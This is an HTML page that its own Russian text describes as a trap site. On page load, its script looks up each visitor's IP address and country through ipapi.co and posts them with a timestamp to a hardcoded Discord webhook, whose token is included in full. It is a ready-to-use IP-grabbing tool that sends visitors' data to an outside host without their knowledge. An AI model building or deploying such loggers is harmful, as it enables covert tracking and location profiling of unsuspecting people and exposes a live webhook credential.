<!DOCTYPE html>
<html>
<head>
    <title>IP Logger</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js" integrity="sha512-T5rJ7hDx8Wp33VDbvIZhKj7b9zQkZ5QxtgvvLwU5OoD5eBc85+oZHvIWq3qKjX1fHn0AfoSyuwYFuxgR0GKsBg==" crossorigin="anonymous"></script>
    <script>
        $.get("https://ipapi.co/json/", function(data) {
            var webhook_url = "https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0"; // замените на свой Discord Webhook
            var ip = data.ip;
            var country_code = data.country_code;
            var country_emoji = getCountryEmoji(country_code);
            var time = moment().format('MMMM Do YYYY, h:mm:ss a');
            var request = new XMLHttpRequest();
            request.open("POST", webhook_url);
            request.setRequestHeader('Content-type', 'application/json');
            var params = {
                username: "IP Logger",
                avatar_url: "https://i.imgur.com/WzAMxKl.png",
                content: "**IP**: " + ip + "\n**Country**: " + country_code + " " + country_emoji + "\n**Time**: " + time
            };
            request.send(JSON.stringify(params));
        });

        function getCountryEmoji(country_code) {
            var codePoints = [...country_code.toUpperCase()].map(c => 127397 + c.charCodeAt());
            return String.fromCodePoint(...codePoints);
        }
    </script>
</head>
<body>
    <h1>IP Logger</h1>
    <p>Это сайт-ловушка, который будет записывать IP-адреса, страны и время посещения людей, которые посещают его.</p>
</body>
</html>
